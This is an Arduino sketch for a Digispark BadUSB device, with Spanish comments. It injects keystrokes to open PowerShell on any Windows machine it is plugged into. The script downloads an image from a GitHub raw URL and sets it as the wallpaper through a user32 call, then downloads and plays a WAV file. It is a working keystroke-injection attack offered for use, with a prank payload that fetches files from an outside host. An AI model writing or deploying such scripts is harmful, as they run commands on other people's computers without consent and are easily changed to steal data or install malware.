#include "DigiKeyboard.h"

void setup() {}
void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(1000);
  
  // Win+R
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print(F("powershell"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1500);
  
  // PRIMERO: Crear carpeta y descargar imagen
  DigiKeyboard.print(F("md D:\\prueba -fo; wget 'https://raw.githubusercontent.com/Leonardo-Gabriel-Perez-Huerta/Pruebas/main/osos-gay-portada.jpg' -O D:\\prueba\\w.jpg;"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);
  
  // SEGUNDO: Definir la clase para el wallpaper (CADA LÍNEA POR SEPARADO)
  DigiKeyboard.print(F("Add-Type -TypeDefinition @\""));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.print(F("using System;"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.print(F("using System.Runtime.InteropServices;"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.print(F("public class W {"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.print(F("[DllImport(\"user32.dll\")] public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.print(F("}"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.print(F("\"@ -Language CSharp"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  
  // TERCERO: Aplicar el wallpaper
  DigiKeyboard.print(F("[W]::SystemParametersInfo(20, 0, 'D:\\prueba\\w.jpg', 3);"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  
  // NUEVO: Descargar y reproducir el archivo de sonido
  DigiKeyboard.print(F("wget 'https://raw.githubusercontent.com/Leonardo-Gabriel-Perez-Huerta/Pruebas/main/prueba.wav' -O D:\\prueba\\play.wav;"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);
  
  DigiKeyboard.print(F("Add-Type -AssemblyName presentationCore;"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.print(F("$filepath = [uri] 'D:\\prueba\\play.wav';"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.print(F("$wmplayer = New-Object System.Windows.Media.MediaPlayer;"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.print(F("$wmplayer.Open($filepath);"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print(F("$wmplayer.Play();"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.print(F("$duration = $wmplayer.NaturalDuration.TimeSpan.TotalSeconds;"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.print(F("Start-Sleep $duration;"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.print(F("$wmplayer.Stop(); $wmplayer.Close();"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.print(F("exit"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  
  for(;;);
}